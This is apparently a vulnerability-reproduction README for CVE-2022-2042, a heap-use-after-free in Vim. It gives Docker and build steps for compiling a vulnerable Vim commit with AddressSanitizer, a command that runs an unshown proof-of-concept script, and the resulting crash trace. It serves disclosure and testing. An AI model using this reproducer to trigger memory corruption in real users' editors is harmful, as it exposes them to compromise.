### CVE-2022-2042

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/8628b4cd-4055-4059-aed4-64f7fdc10eba/)

### Docker Container Run Command
```shell
docker build -t cve-2022-2042-poc .
docker run -itd --name CVE-2022-2042-POC cve-2022-2042-poc
docker exec -it CVE-2022-2042-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the Vim repository. (ssh-keygen)
cd /poc
git clone git@github.com:vim/vim.git

# Rollback to the vulnerable version.
cd vim/
git reset --hard 1d97db3d9

# Install the compilation and installation dependencies for Vim.
apt install gcc make clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Enter the `src` directory.
cd ./src

# Configure, compile, and install Vim.
./configure --with-features=huge --enable-gui=no --enable-pythoninterp=no CFLAGS="-fsanitize=address -fno-omit-frame-pointer" LDFLAGS="-fsanitize=address"
make
make install

# Open the poc file.
vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/poc_skipwhite -c :qa!
or
ASAN_OPTIONS=detect_leaks=1 vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/poc_skipwhite -c :qa!
```

### Description
Observed that:
```shell
=================================================================
==8889==ERROR: AddressSanitizer: heap-use-after-free on address 0xffffa9f0bb50 at pc 0xaaaad727ced8 bp 0xffffe968e3c0 sp 0xffffe968e3b8
READ of size 1 at 0xffffa9f0bb50 thread T0
#0 0xaaaad727ced4  (/usr/local/bin/vim+0xc1bed4) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#1 0xaaaad6f37508  (/usr/local/bin/vim+0x8d6508) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#2 0xaaaad6d093fc  (/usr/local/bin/vim+0x6a83fc) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#3 0xaaaad6ce47cc  (/usr/local/bin/vim+0x6837cc) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#4 0xaaaad6af4f54  (/usr/local/bin/vim+0x493f54) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#5 0xaaaad6af4ae4  (/usr/local/bin/vim+0x493ae4) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#6 0xaaaad6af4834  (/usr/local/bin/vim+0x493834) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#7 0xaaaad6ad0650  (/usr/local/bin/vim+0x46f650) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#8 0xaaaad6ac5640  (/usr/local/bin/vim+0x464640) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#9 0xaaaad6ed30bc  (/usr/local/bin/vim+0x8720bc) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#10 0xaaaad6ed0f34  (/usr/local/bin/vim+0x86ff34) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#11 0xaaaad6ed0a7c  (/usr/local/bin/vim+0x86fa7c) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#12 0xaaaad6ed04f8  (/usr/local/bin/vim+0x86f4f8) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#13 0xaaaad6ad0650  (/usr/local/bin/vim+0x46f650) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#14 0xaaaad6ac5640  (/usr/local/bin/vim+0x464640) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#15 0xaaaad6ac7f30  (/usr/local/bin/vim+0x466f30) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#16 0xaaaad7291d24  (/usr/local/bin/vim+0xc30d24) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#17 0xaaaad728f998  (/usr/local/bin/vim+0xc2e998) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#18 0xaaaad7289828  (/usr/local/bin/vim+0xc28828) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#19 0xffffad6e73f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8) (BuildId: f37f3aa07c797e333fd106472898d361f71798f5)
#20 0xffffad6e74c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8) (BuildId: f37f3aa07c797e333fd106472898d361f71798f5)
#21 0xaaaad6833dac  (/usr/local/bin/vim+0x1d2dac) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)

0xffffa9f0bb50 is located 0 bytes inside of 1-byte region [0xffffa9f0bb50,0xffffa9f0bb51)
freed by thread T0 here:
#0 0xaaaad68aaccc in free (/usr/local/bin/vim+0x249ccc) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#1 0xaaaad68e26f8  (/usr/local/bin/vim+0x2816f8) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#2 0xaaaad6c6a5a0  (/usr/local/bin/vim+0x6095a0) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#3 0xaaaad6c77c20  (/usr/local/bin/vim+0x616c20) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#4 0xaaaad6f36868  (/usr/local/bin/vim+0x8d5868) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#5 0xaaaad6d093fc  (/usr/local/bin/vim+0x6a83fc) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#6 0xaaaad6ce47cc  (/usr/local/bin/vim+0x6837cc) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#7 0xaaaad6af4f54  (/usr/local/bin/vim+0x493f54) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#8 0xaaaad6af4ae4  (/usr/local/bin/vim+0x493ae4) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#9 0xaaaad6af4834  (/usr/local/bin/vim+0x493834) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#10 0xaaaad6ad0650  (/usr/local/bin/vim+0x46f650) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#11 0xaaaad6ac5640  (/usr/local/bin/vim+0x464640) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#12 0xaaaad6ed30bc  (/usr/local/bin/vim+0x8720bc) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#13 0xaaaad6ed0f34  (/usr/local/bin/vim+0x86ff34) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#14 0xaaaad6ed0a7c  (/usr/local/bin/vim+0x86fa7c) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#15 0xaaaad6ed04f8  (/usr/local/bin/vim+0x86f4f8) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#16 0xaaaad6ad0650  (/usr/local/bin/vim+0x46f650) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#17 0xaaaad6ac5640  (/usr/local/bin/vim+0x464640) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#18 0xaaaad6ac7f30  (/usr/local/bin/vim+0x466f30) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#19 0xaaaad7291d24  (/usr/local/bin/vim+0xc30d24) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#20 0xaaaad728f998  (/usr/local/bin/vim+0xc2e998) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#21 0xaaaad7289828  (/usr/local/bin/vim+0xc28828) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#22 0xffffad6e73f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8) (BuildId: f37f3aa07c797e333fd106472898d361f71798f5)
#23 0xffffad6e74c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8) (BuildId: f37f3aa07c797e333fd106472898d361f71798f5)
#24 0xaaaad6833dac  (/usr/local/bin/vim+0x1d2dac) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)

previously allocated by thread T0 here:
#0 0xaaaad68aaf60 in __interceptor_malloc (/usr/local/bin/vim+0x249f60) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#1 0xaaaad68e2298  (/usr/local/bin/vim+0x281298) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#2 0xaaaad68e21e0  (/usr/local/bin/vim+0x2811e0) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#3 0xaaaad6e9b7a0  (/usr/local/bin/vim+0x83a7a0) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#4 0xaaaad6d18df4  (/usr/local/bin/vim+0x6b7df4) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#5 0xaaaad6d06c74  (/usr/local/bin/vim+0x6a5c74) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#6 0xaaaad6ce47cc  (/usr/local/bin/vim+0x6837cc) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#7 0xaaaad6af4f54  (/usr/local/bin/vim+0x493f54) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#8 0xaaaad6af4ae4  (/usr/local/bin/vim+0x493ae4) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#9 0xaaaad6af4834  (/usr/local/bin/vim+0x493834) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#10 0xaaaad6ad0650  (/usr/local/bin/vim+0x46f650) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#11 0xaaaad6ac5640  (/usr/local/bin/vim+0x464640) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#12 0xaaaad6ed30bc  (/usr/local/bin/vim+0x8720bc) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#13 0xaaaad6ed0f34  (/usr/local/bin/vim+0x86ff34) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#14 0xaaaad6ed0a7c  (/usr/local/bin/vim+0x86fa7c) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#15 0xaaaad6ed04f8  (/usr/local/bin/vim+0x86f4f8) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#16 0xaaaad6ad0650  (/usr/local/bin/vim+0x46f650) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#17 0xaaaad6ac5640  (/usr/local/bin/vim+0x464640) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#18 0xaaaad6ac7f30  (/usr/local/bin/vim+0x466f30) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#19 0xaaaad7291d24  (/usr/local/bin/vim+0xc30d24) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#20 0xaaaad728f998  (/usr/local/bin/vim+0xc2e998) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#21 0xaaaad7289828  (/usr/local/bin/vim+0xc28828) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
#22 0xffffad6e73f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8) (BuildId: f37f3aa07c797e333fd106472898d361f71798f5)
#23 0xffffad6e74c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8) (BuildId: f37f3aa07c797e333fd106472898d361f71798f5)
#24 0xaaaad6833dac  (/usr/local/bin/vim+0x1d2dac) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)

SUMMARY: AddressSanitizer: heap-use-after-free (/usr/local/bin/vim+0xc1bed4) (BuildId: 38ad7e96877acf8516f450e3b6e6943c1fc23188)
Shadow bytes around the buggy address:
0x200ff53e1710: fa fa fd fa fa fa fd fd fa fa fd fd fa fa 02 fa
0x200ff53e1720: fa fa fd fa fa fa fd fa fa fa fd fa fa fa 01 fa
0x200ff53e1730: fa fa 01 fa fa fa 01 fa fa fa 01 fa fa fa 00 00
0x200ff53e1740: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff53e1750: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x200ff53e1760: fa fa fa fa fa fa 02 fa fa fa[fd]fa fa fa fd fa
0x200ff53e1770: fa fa 01 fa fa fa 00 00 fa fa 01 fa fa fa 04 fa
0x200ff53e1780: fa fa fd fa fa fa fd fd fa fa fd fd fa fa fd fd
0x200ff53e1790: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
0x200ff53e17a0: fa fa fd fa fa fa fd fd fa fa fd fd fa fa fd fd
0x200ff53e17b0: fa fa fd fa fa fa fd fd fa fa fd fd fa fa fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
==8889==ABORTING
```



